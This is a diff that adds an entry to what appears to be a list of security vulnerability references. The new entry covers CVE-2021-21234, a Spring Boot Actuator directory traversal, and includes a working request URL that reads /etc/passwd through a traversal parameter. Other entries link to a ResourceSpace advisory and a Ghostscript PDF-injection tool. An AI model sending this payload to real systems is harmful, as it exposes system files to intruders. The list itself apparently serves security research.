@@ -74,5 +74,14 @@ https://www.horizon3.ai/multiple-vulnerabilities-in-resourcespace/
 ## Tool that helps to embed a PostScript file into a PDF in a way that GhostScript will run the PostScript code during the PDF processing
 https://github.com/neex/ghostinthepdf
 
+## CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal
+https://pyn3rd.github.io/2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/
+```
+http://localhost:8887/manage/log/view?filename=/etc/passwd&base=../../../../../
+```
+
+
+
+
 
 
